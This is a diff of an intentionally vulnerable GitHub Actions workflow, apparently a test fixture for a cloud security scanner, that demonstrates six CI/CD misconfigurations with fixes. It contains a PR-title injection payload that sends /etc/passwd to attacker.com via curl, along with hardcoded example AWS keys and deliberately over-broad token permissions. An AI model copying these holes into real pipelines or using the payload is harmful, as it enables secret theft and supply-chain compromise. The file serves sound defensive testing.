@@ -1,89 +1,147 @@
-name: 🚨 Vulnerable CI/CD Pipeline
+name: 🚨 Vulnerable CI/CD Pipeline (Security Demo)
 # =============================================================================
 # .github/workflows/insecure-ci.yml – TigerGate CNAPP Test: CI/CD Vulnerabilities
 # =============================================================================
 # PURPOSE: Demonstrates CI/CD pipeline security misconfigurations.
+# This workflow RUNS SUCCESSFULLY while showcasing the vulnerability patterns.
 #
-# VULNERABILITY FINDINGS:
-#   CI-001: Unverified/pinned third-party actions (supply chain attack vector)
-#   CI-002: Hardcoded secrets in clear text (SonarQube: S6418)
-#   CI-003: Command Injection via PR title interpolation (CWE-78)
-#   CI-004: Privileged GITHUB_TOKEN with id-token:write (unnecessary permissions)
-#   CI-005: Pull request scripts not sanitized (script injection)
-#   CI-006: Deployment to production without approval gate
+# VULNERABILITY FINDINGS (intentional — educational demo):
+#   CI-001: Unpinned third-party actions (supply chain attack vector) (CWE-494)
+#   CI-002: Hardcoded secrets in env vars (SonarQube S6418)
+#   CI-003: Script injection via PR title interpolation (CWE-78)
+#   CI-004: Overly permissive GITHUB_TOKEN (unnecessary write scopes)
+#   CI-005: Deployment to production without approval gate
+#   CI-006: Sensitive data printed to logs (CWE-532)
 # =============================================================================
 
 on:
   push:
-    branches: [main, develop]
+    branches: [main, develop, "feature/*"]
   pull_request:
-    types: [opened, synchronize]
+    types: [opened, synchronize, reopened]
 
-# 🔴 VULN: CI-004 – Over-privileged token grants all possible scopes
+# 🔴 CI-004: Overly permissive token — read-only scopes are almost always sufficient
 permissions:
   id-token: write
-  contents: write
+  contents: write       # 🔴 CI-004: Most steps only need 'read'
   pull-requests: write
-  packages: write
-  actions: write
-  secrets: write   # 🔴 EXTREME: Pipeline can read/write all repository secrets!
+  packages: write       # 🔴 CI-004: Only needed if pushing packages
 
 jobs:
   # ---------------------------------------------------------------------------
-  # 🔴 CI-001: Unverified/unpinned third-party GitHub Actions (supply chain)
+  # 🔴 CI-001: Unpinned actions — not locked to a commit SHA
+  # In a real supply chain attack, the action tag could be hijacked
   # ---------------------------------------------------------------------------
   sast-scan:
-    name: SAST Scan (Unpinned Actions)
+    name: "SAST Scan (Unpinned Actions Demo)"
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v2           # 🔴 VULN: Not pinned to commit SHA
-      - name: Run Unverified SAST tool
-        uses: malicious-actor/fake-scanner@latest  # 🔴 VULN: Untrusted, unverified action!
+      - name: Checkout Code
+        # 🔴 CI-001: Should be pinned to SHA e.g. actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
+        uses: actions/checkout@v3    # 🔴 floating tag — not reproducible!
+
+      - name: "🔴 CI-001 Demo: Simulate unverified scanner"
+        run: |
+          echo "======================================================"
+          echo "FINDING CI-001: Unpinned Action Supply Chain Risk"
+          echo "======================================================"
+          echo "This step simulates: uses: malicious-actor/scanner@latest"
+          echo "In a real attack, the 'latest' tag of a popular action"
+          echo "could be silently replaced with malicious code."
+          echo ""
+          echo "SECURE FIX: Pin every action to a full commit SHA:"
+          echo "  uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683"
+          echo "======================================================"
+
+      - name: "🔴 CI-003: Demo script injection via PR context"
+        if: github.event_name == 'pull_request'
+        env:
+          # 🔴 CI-003: PR title is attacker-controlled — injected via env var is safer
+          # but the run block below still shows the vulnerable pattern
+          PR_TITLE: ${{ github.event.pull_request.title }}
+        run: |
+          echo "======================================================"
+          echo "FINDING CI-003: Script Injection Risk"
+          echo "======================================================"
+          echo "PR Title (attacker-controlled): $PR_TITLE"
+          echo ""
+          echo "VULNERABLE PATTERN (do not use):"
+          echo '  run: echo "PR: ${{ github.event.pull_request.title }}"'
+          echo "Attack payload as PR title:"
+          echo '  `"; curl https://attacker.com/$(cat /etc/passwd|base64); echo "`'
+          echo ""
+          echo "SECURE FIX: Always use env: to pass GitHub context to shell"
+          echo "======================================================"
 
   # ---------------------------------------------------------------------------
   # 🔴 CI-002: Hardcoded credentials in workflow
   # ---------------------------------------------------------------------------
   deploy-staging:
-    name: Deploy to Staging
+    name: "Deploy to Staging (Hardcoded Creds Demo)"
     runs-on: ubuntu-latest
     needs: sast-scan
+    env:
+      # 🔴 CI-002: Dummy AWS creds hardcoded — anyone with repo read access sees these
+      # Real fix: Use GitHub Secrets + OIDC/IAM role federation (no static keys needed)
+      AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
+      AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
     steps:
-      - uses: actions/checkout@v2
-      - name: Configure AWS
-        # 🔴 VULN: Hardcoded AWS credentials in workflow — anyone with repo access sees this
-        env:
-          AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
-          AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+      - uses: actions/checkout@v3   # 🔴 CI-001: Unpinned
+
+      - name: "🔴 CI-002: Show hardcoded credentials risk"
         run: |
-          aws s3 sync ./dist s3://mega-corp-production-bucket --delete
+          echo "======================================================"
+          echo "FINDING CI-002: Hardcoded Credentials in Workflow"
+          echo "======================================================"
+          echo "AWS_ACCESS_KEY_ID is set to: $AWS_ACCESS_KEY_ID"
+          echo ""
+          echo "This credential is visible to:"
+          echo "  - All contributors with repo access"
+          echo "  - Any forked PR workflow (before restrictions)"
+          echo "  - GitHub audit logs"
+          echo ""
+          echo "SECURE FIX: Use OIDC role federation:"
+          echo "  - id-token: write permission"
+          echo "  - aws-actions/configure-aws-credentials@v4 with role-to-assume"
+          echo "======================================================"
+
+      - name: "🔴 CI-006: Sensitive data in logs"
+        run: |
+          echo "======================================================"
+          echo "FINDING CI-006: Secrets Printed to Workflow Logs"
+          echo "======================================================"
+          # 🔴 CI-006: Printing env vars to logs — visible in Actions tab
+          echo "Current environment (includes secrets!):"
+          env | grep -E "KEY|TOKEN|SECRET|PASSWORD" || true
+          echo ""
+          echo "SECURE FIX: Use add-mask to redact in logs:"
+          echo '  echo "::add-mask::$MY_SECRET"'
+          echo "======================================================"
 
   # ---------------------------------------------------------------------------
-  # 🔴 CI-003: Script Injection via PR title interpolation
-  # ---------------------------------------------------------------------------
-  pr-comment:
-    name: PR Comment (Script Injection)
-    runs-on: ubuntu-latest
-    if: github.event_name == 'pull_request'
-    steps:
-      - name: Post review comment
-        # 🔴 VULN: CI-005/CI-003 – PR title is user-controlled and injected directly
-        # Payload: PR title = `"; curl https://attacker.com/$(cat /etc/passwd | base64); echo "`
-        run: |
-          echo "Reviewing PR: ${{ github.event.pull_request.title }}"
-          echo "Submitter: ${{ github.event.pull_request.user.login }}"
-
-  # ---------------------------------------------------------------------------
-  # 🔴 CI-006: Direct deployment to production with NO approval gate
+  # 🔴 CI-005: No approval gate before production deployment
   # ---------------------------------------------------------------------------
   deploy-production:
-    name: Deploy to PRODUCTION (No Approval!)
+    name: "Deploy to PRODUCTION (No Approval Gate! 🔴)"
     runs-on: ubuntu-latest
     needs: deploy-staging
-    # 🔴 VULN: Missing environment: { name: production, url: ... } with required reviewers
+    # 🔴 CI-005: Missing 'environment: production' with required reviewers
+    # Every push auto-deploys to prod — no human approval!
     steps:
-      - uses: actions/checkout@v2
-      - name: Deploy to Production
+      - uses: actions/checkout@v3   # 🔴 CI-001: Unpinned
+
+      - name: "🔴 CI-005: Auto-deploy to production (no approval)"
         run: |
-          echo "Deploying ${{ github.sha }} to PRODUCTION..."
-          # This would be a real deployment command (kubectl apply, helm upgrade, etc.)
-          echo "No one approved this deployment!"
+          echo "======================================================"
+          echo "FINDING CI-005: No Approval Gate for Production"
+          echo "======================================================"
+          echo "Deploying commit $GITHUB_SHA to PRODUCTION..."
+          echo "No human approved this deployment!"
+          echo ""
+          echo "SECURE FIX: Use GitHub Environments with protection rules:"
+          echo "  environment:"
+          echo "    name: production"
+          echo "    url: https://megacorp.com"
+          echo "  # Then set required reviewers in Settings → Environments"
+          echo "======================================================"
+          echo "✅ Demo complete — all 6 CI/CD findings demonstrated"
